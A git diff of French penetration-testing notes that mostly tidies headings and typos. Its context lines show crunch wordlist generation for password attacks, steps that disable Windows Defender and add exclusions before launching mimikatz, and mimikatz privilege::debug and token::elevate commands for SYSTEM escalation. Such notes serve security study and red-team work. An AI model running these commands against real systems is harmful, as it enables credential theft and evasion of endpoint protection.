@@ -571,11 +571,13 @@ Evilwinrm permet aussi de se connecter avec un hash NTLM (Pass-the-Hash) et de c
 
 
 
-# __CREATIING A PASSWORD LIST__
+# __CREATING A PASSWORD LIST__
 
 
 > Outils : crunch, sed, heredoc (EOF), printf, boucles for <br>
 > ATT&CK Technique : Credential Access
+
+<br>
 
 crunch est pratique pour créer des variations d'un même mot
 ```sh
@@ -606,7 +608,7 @@ crunch 9 9  -t Toto%%%%\! | sed -n '1000,9999p' >> Toto-1000-9999-!.txt
 
 <br>
 
-### Explication sur printf 
+### Boucles for & printf 
 
 Le principe des formats printf (%d, %04d, etc.) est le même que dans le language C (les regex suivent des principes similaires).
 
@@ -649,6 +651,8 @@ toto*0002
 ...
 ```
 
+### Créer une liste avec heredoc
+
 Liste de mots simple (Here document ou heredoc est pratique pour faire du ligne par ligne)
 ```sh
 cat << EOF >> Nord.txt
@@ -662,6 +666,8 @@ EOF
 End-of-file (EOF) est un marqueur qui indique la fin d'entrée d'un flux.
 
 <br>
+
+### Utiliser `sed`
 
 Création d'un fichier d'agrément temporaire :
 ```sh
@@ -811,7 +817,7 @@ klist
 
 <br>
 
-##Télécharger mimikatz
+### Télécharger mimikatz
 
 Désactiver Defender, exclusion "C:\Windows\Temp", exclusion des .exe et .ps1
 ```powershell		
@@ -827,7 +833,9 @@ Expand-Archive mimi.zip
 Start-Process .\mimi\x64\mimikatz.exe
 ```
 
-### Élévations de privilèges système avec Mimikatz sur la machine locale (nécéssite droits local admin `SeDebugPrivilege`)
+### Élévations de privilèges système
+
+Mimikatz permet d'agir avec le compte `AUTORITE NT\Système` sur la machine locale (nécéssite droits local admin `SeDebugPrivilege`)
 ```shell
 privilege::debug
 token::elevate
@@ -890,7 +898,7 @@ Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
 
 
 
-*Cette partie a besoin d'être amélioré*
+*Cette partie a besoin d'être améliorée*
 
 
 
